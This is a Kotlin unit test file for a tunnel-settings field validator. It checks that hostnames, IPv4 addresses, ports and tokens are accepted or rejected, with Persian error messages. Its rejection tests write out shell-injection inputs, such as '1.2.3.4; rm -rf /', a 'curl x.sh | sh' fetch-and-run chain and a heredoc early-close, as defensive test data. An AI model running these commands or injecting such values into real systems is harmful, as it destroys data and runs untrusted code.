package org.didban.monitor

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test

class TunnelFieldValidationTest {

    // ── hosts ───────────────────────────────────────────────────────────────

    @Test
    fun `accepts DNS hostnames`() {
        assertTrue(TunnelFieldValidation.isHost("example.com"))
        assertTrue(TunnelFieldValidation.isHost("my-server.internal"))
        assertTrue(TunnelFieldValidation.isHost("a-b-c.example.co.uk"))
    }

    @Test
    fun `accepts IPv4 addresses`() {
        assertTrue(TunnelFieldValidation.isHost("10.20.30.40"))
        assertTrue(TunnelFieldValidation.isHost("192.168.1.1"))
    }

    @Test
    fun `rejects shell injection attempts as hosts`() {
        assertFalse(TunnelFieldValidation.isHost("$(reboot)"))
        assertFalse(TunnelFieldValidation.isHost("`id`"))
        assertFalse(TunnelFieldValidation.isHost("1.2.3.4; rm -rf /"))
        assertFalse(TunnelFieldValidation.isHost("1.2.3.4 && curl x.sh | sh"))
        assertFalse(TunnelFieldValidation.isHost("a b"))
        assertFalse(TunnelFieldValidation.isHost(""))
    }

    @Test
    fun `rejects heredoc early-close and script termination`() {
        assertFalse(TunnelFieldValidation.isHost("1.2.3.4\nEOF\nrm -rf /"))
        assertFalse(TunnelFieldValidation.isHost("host\nEOF"))
        assertFalse(TunnelFieldValidation.isHost("host\n"))
        assertFalse(TunnelFieldValidation.isHost("host\"; drop\"; echo x"))
    }

    @Test
    fun `rejects overly long hosts`() {
        assertFalse(TunnelFieldValidation.isHost("a".repeat(254)))
    }

    // ── strict IPv4 (kernel targets) ────────────────────────────────────────

    @Test
    fun `ipv4 strictness`() {
        assertTrue(TunnelFieldValidation.isIpv4("10.200.200.1"))
        assertFalse(TunnelFieldValidation.isIpv4("256.1.1.1"))
        assertFalse(TunnelFieldValidation.isIpv4("10.200.200"))
        assertFalse(TunnelFieldValidation.isIpv4("10.200.200.1.5"))
        assertFalse(TunnelFieldValidation.isIpv4("10.200.200.1; reboot"))
    }

    // ── ports ──────────────────────────────────────────────────────────────

    @Test
    fun `port bounds`() {
        assertTrue(TunnelFieldValidation.isValidPort(1))
        assertTrue(TunnelFieldValidation.isValidPort(65535))
        assertFalse(TunnelFieldValidation.isValidPort(0))
        assertFalse(TunnelFieldValidation.isValidPort(65536))
        assertFalse(TunnelFieldValidation.isValidPort(-1))
    }

    // ── tokens (CLI arguments) ──────────────────────────────────────────────

    @Test
    fun `token charset`() {
        assertTrue(TunnelFieldValidation.isValidToken("Abc_123-x"))
        assertFalse(TunnelFieldValidation.isValidToken("a b"))
        assertFalse(TunnelFieldValidation.isValidToken("a\"b"))
        assertFalse(TunnelFieldValidation.isValidToken("$(x)"))
        assertFalse(TunnelFieldValidation.isValidToken("a\nb"))
        assertFalse(TunnelFieldValidation.isValidToken(""))
        assertFalse(TunnelFieldValidation.isValidToken("a".repeat(129)))
    }

    // ── error-message helpers ───────────────────────────────────────────────

    @Test
    fun `checkHost returns null for valid, message for invalid`() {
        assertNull(TunnelFieldValidation.checkHost("1.2.3.4", "Host"))
        assertTrue(TunnelFieldValidation.checkHost("1.2.3.4; rm -rf /", "Host")!!.contains("نامعتبر"))
    }

    @Test
    fun `checkIpv4 returns null for valid, message for invalid`() {
        assertNull(TunnelFieldValidation.checkIpv4("10.1.1.1", "VIP"))
        assertTrue(TunnelFieldValidation.checkIpv4("10.1.1; x", "VIP")!!.contains("IPv4"))
    }

    @Test
    fun `checkToken returns null for valid, message for invalid`() {
        assertNull(TunnelFieldValidation.checkToken("abc_123", "Token"))
        assertEquals(
            "Token باید ۱ تا ۱۲۸ کاراکتر از [A-Za-z0-9_-] باشد: a b",
            TunnelFieldValidation.checkToken("a b", "Token")
        )
    }
}
